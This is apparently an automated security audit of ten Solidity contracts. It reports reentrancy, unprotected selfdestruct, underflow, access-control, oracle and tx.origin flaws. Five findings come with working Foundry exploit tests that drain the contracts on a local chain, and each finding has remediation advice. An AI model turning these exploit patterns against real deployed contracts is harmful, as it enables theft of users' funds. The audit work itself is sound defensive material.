# Culpa audit — sleuth on `committed`

Model: `gemini-3.5-flash-lite` · 10 contract(s) · 7 finding(s), 5 proven with a landed exploit

## Summary

| Contract | Verdict | Findings |
|---|---|---|
| FlashFarm | vulnerable | logic-error (high, PROVEN) |
| GlassJaw | vulnerable | unprotected-selfdestruct (high, PROVEN) |
| HallOfMirrors | vulnerable | price-oracle-manipulation (high) |
| HollowVault | vulnerable | reentrancy (high, PROVEN) |
| Irongate | no findings | — |
| LatchGate | no findings | — |
| LooseLedger | vulnerable | arithmetic (high, PROVEN) |
| OpenTill | vulnerable | access-control (high, PROVEN) |
| OriginGate | vulnerable | tx-origin-auth (high) |
| TrueVault | no findings | — |

## FlashFarm — logic-error (🔴 high) · ✅ PROVEN

The contract calculates reward distribution based on instantaneous share of totalStaked rather than time-weighted stakes. An attacker exploits this by flash-depositing a massive stake immediately before `claim()` to capture nearly the entire reward pool, and instantly withdrawing in the same transaction.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `989010989010989010989`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {FlashFarm, Token} from "@contracts/FlashFarm.sol";

contract ProveFlashFarmLeadOne is ExploitProof {
    function test_ex() external {}
    function test_exploit() external {
        Token stakeToken = new Token();
        Token rewardToken = new Token();
        FlashFarm farm = new FlashFarm(stakeToken, rewardToken);

        address alice = makeAddr("alice");
        stakeToken.mint(alice, 100 ether);
        vm.prank(alice);
        stakeToken.approve(address(farm), 100 ether);
        vm.prank(alice);
        farm.stake(100 ether);

        rewardToken.mint(address(this), 1000 ether);
        rewardToken.approve(address(farm), 1000 ether);
        farm.fund(1000 ether);

        address attacker = makeAddr("attacker");
        stakeToken.mint(attacker, 9000 ether);

        vm.startPrank(attacker);
        stakeToken.approve(address(farm), 9000 ether);
        farm.stake(9000 ether);
        farm.claim();
        farm.unstake(9000 ether);
        vm.stopPrank();

        profit = rewardToken.balanceOf(attacker);
        assertExploitLanded(500 ether);
    }
}
```

**Remediation.** Re-examine the invariant the function should preserve and add property tests around it.

---

## GlassJaw — unprotected-selfdestruct (🔴 high) · ✅ PROVEN

The `GlassJaw.demolish` function lacks access control, allowing an arbitrary caller to execute `selfdestruct` and instantly drain the contract's entire ETH balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {GlassJaw} from "@contracts/GlassJaw.sol";

contract ProveGlassJawUnprotectedDemolish is ExploitProof {
    function test_exploit() external {
        GlassJaw v = new GlassJaw();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        v.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        v.demolish(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Guard `selfdestruct` behind an owner check, or remove it.

---

## HallOfMirrors — price-oracle-manipulation (🔴 high) · unconfirmed

An attacker uses QuickLoan to flash-loan a large amount of cash, swaps it into MirrorPool for stake to artificially inflate the spot price of stake, pledges a small amount of stake to PawnShop, draws a massive amount of cash against the inflated collateral value, swaps remaining stake/cash back to repay the flash loan, and walks away with profit, leaving PawnShop insolvent.

**Remediation.** Do not use an AMM spot price as an oracle. Use a TWAP, a dedicated price feed, or a manipulation-resistant source, and sanity-check against a second source.

---

## HollowVault — reentrancy (🔴 high) · ✅ PROVEN

HollowVault is vulnerable to reentrancy because it transfers ETH via `msg.sender.call` before zeroing out the caller's balance. An attacker's fallback function re-enters `withdraw()`, draining the vault's entire balance in a single transaction.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {HollowVault} from "@contracts/HollowVault.sol";

contract Raider {
    HollowVault v;
    constructor(HollowVault _v) payable { v = _v; }
    function go() external { v.deposit{value: 1 ether}(); v.withdraw(); }
    receive() external payable {
        if (address(v).balance >= 1 ether) {
            v.withdraw();
        }
    }
}

contract ProveHollowVaultLeadOne is ExploitProof {
    function test_exploit() external {
        HollowVault v = new HollowVault();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice); v.deposit{value: 10 ether}();

        Raider raider = new Raider{value: 1 ether}(v);
        raider.go();

        profit = address(raider).balance - 1 ether;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Apply checks-effects-interactions — update state before the external call — or wrap the function in a reentrancy guard.

---

## LooseLedger — arithmetic (🔴 high) · ✅ PROVEN

An `unchecked` arithmetic underflow in `spend(amount)` allows users to bypass balance checks, causing `points[msg.sender]` to wrap to a massive value (`2^256 - x`). This enables the attacker to repeatedly drain the contract's entire ETH balance.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `5000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {LooseLedger} from "@contracts/LooseLedger.sol";

contract ProveLooseLedgerLeadOne is ExploitProof {
    function test_exploit() external {
        LooseLedger ledger = new LooseLedger();
        address payable attacker = payable(makeAddr("attacker"));

        // Seed the ledger with some ETH
        vm.deal(address(ledger), 10 ether);

        // Attacker spends more than their balance (0), causing underflow and extracting ETH
        vm.prank(attacker);
        ledger.spend(5 ether);

        profit = attacker.balance;
        assertExploitLanded(1 ether);
    }
}
```

**Remediation.** Remove the `unchecked` block or add explicit bounds checks; on Solidity <0.8 use SafeMath.

---

## OpenTill — access-control (🔴 high) · ✅ PROVEN

OpenTill lacks access control on its `drain` function, allowing anyone to pass an arbitrary address as a parameter. An attacker invoked this function directly to transfer the contract's entire ETH balance to themselves, resulting in a total loss of funds.

**Proven on a local chain.** The exploit below runs green under `forge test`; attacker profit = `10000000000000000000`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {ExploitProof} from "@proof/ExploitProof.sol";
import {OpenTill} from "@contracts/OpenTill.sol";

contract ProveOpenTillLeadOne is ExploitProof {
    function test_exploit() external {
        OpenTill till = new OpenTill();
        address alice = makeAddr("alice");
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        till.deposit{value: 10 ether}();

        address payable attacker = payable(makeAddr("attacker"));
        vm.prank(attacker);
        till.drain(attacker);

        profit = attacker.balance;
        assertExploitLanded(5 ether);
    }
}
```

**Remediation.** Restrict the function to an authorized role. A function that moves funds must never be callable by an arbitrary address.

---

## OriginGate — tx-origin-auth (🔴 high) · unconfirmed

The attacker tricks the owner into calling a malicious contract. The malicious contract calls OriginGate.withdraw(attackerAddress, balance), and because tx.origin is checked instead of msg.sender, the authorization passes and the entire balance of OriginGate is sent to the attacker in a single transaction.

**Remediation.** Authenticate with `msg.sender`, never `tx.origin` — `tx.origin` lets a phished user's call be relayed by an attacker contract.

---
